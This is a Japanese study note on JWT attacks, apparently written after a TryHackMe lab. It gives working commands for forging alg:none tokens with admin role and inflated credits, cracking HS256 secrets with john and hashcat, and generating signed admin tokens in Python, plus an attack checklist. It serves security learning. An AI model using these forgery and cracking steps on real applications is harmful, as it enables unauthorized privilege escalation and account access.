---
tags: [hacking, skill, web, jwt, authentication]
category: Web Attacks
difficulty: beginner-intermediate
learned_from: TryHeartMe
date: 2026-03-30
---

# JWT攻撃 (JSON Web Token)

## 概要

JWTはWebアプリの認証・認可によく使われるトークン形式。
実装の不備を突くことでロール昇格・クレジット改ざん等が可能になる。

## JWT の構造

```
ヘッダー.ペイロード.署名
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciJ9.xxxxx
```

各部分は **Base64URL エンコード**されている（署名はHMACなど）。

### デコード方法

```bash
# ペイロード部分をデコード（中央のセグメント）
echo "<ペイロード部分>" | base64 -d 2>/dev/null

# 例
echo "eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoidXNlciIsImNyZWRpdHMiOjB9" | base64 -d
# → {"email":"test@test.com","role":"user","credits":0}
```

---

## 攻撃手法

### 1. alg:none 攻撃（署名検証スキップ）

サーバーが `alg: none`（署名なし）を受け入れる場合、任意のペイロードを署名なしで送り込める。

```bash
# ヘッダー: alg を none に変更
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')

# ペイロード: 改ざんしたい値を変更
PAYLOAD=$(echo -n '{"email":"attacker@test.com","role":"admin","credits":9999}' | base64 | tr -d '=' | tr '+/' '-_')

# 署名なしトークン（末尾の . が必須）
TOKEN="${HEADER}.${PAYLOAD}."
echo $TOKEN
```

**確認方法:**
```bash
curl -s http://<IP>/admin \
  -H "Cookie: session_jwt=${TOKEN}"
```

---

### 2. 弱い秘密鍵のブルートフォース（HS256）

HS256（HMAC-SHA256）を使っている場合、秘密鍵が弱ければクラック可能。
秘密鍵が判明すれば正規の署名付きトークンを自作できる。

```bash
# john でJWT秘密鍵をクラック
echo "<JWT全体>" > jwt.txt
john --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt --format=HMAC-SHA256

# hashcat でクラック
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

秘密鍵が判明したら python で正規トークンを生成：

```python
import jwt
secret = "発見した秘密鍵"
payload = {"email": "test@test.com", "role": "admin", "credits": 9999}
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

---

### 3. アルゴリズム混乱攻撃（RS256 → HS256）

RS256（非対称）を使っているサーバーに HS256（対称）トークンを送り込む。
公開鍵を秘密鍵として使わせる高度な攻撃。

---

### 4. IDOR（IDの改ざん）

```json
{"user_id": 1}  →  {"user_id": 2}
```

ペイロード内のIDを変えて他ユーザーの情報にアクセスする。

---

## チェックリスト

登録・ログイン時にJWTが発行される場合、以下を確認：

- [ ] ペイロードをデコードして `role`, `admin`, `credits`, `user_id` 等の値を確認
- [ ] `alg: none` が受け入れられるか試みる
- [ ] HS256 の場合、秘密鍵をブルートフォース
- [ ] ペイロードの値を改ざんして送信し、サーバーの反応を確認

---

## 使いどころ

- ログイン後のCookieに `jwt`, `token`, `auth` などが含まれる場合
- レスポンスヘッダーの `Set-Cookie` を確認
- `eyJ` で始まるCookie値はほぼJWT

---

## ハマったポイント

- Base64URLは通常のBase64と異なる（`+`→`-`, `/`→`_`, パディング`=`なし）
- alg:none トークンは **末尾の `.` が必須**（署名部分が空でも `.` を付ける）
- 購入などPOSTリクエストのリダイレクト後に新しいJWTが発行されることがある

---

## 参考リンク

- [PortSwigger: JWT attacks](https://portswigger.net/web-security/jwt)
- [HackTricks: JWT](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
- [jwt.io](https://jwt.io/) — JWTのデコード・デバッグ

## 関連スキル

- [[Skills/SQL-Injection]]
- [[Boxes/TryHackMe/tryheartme]]
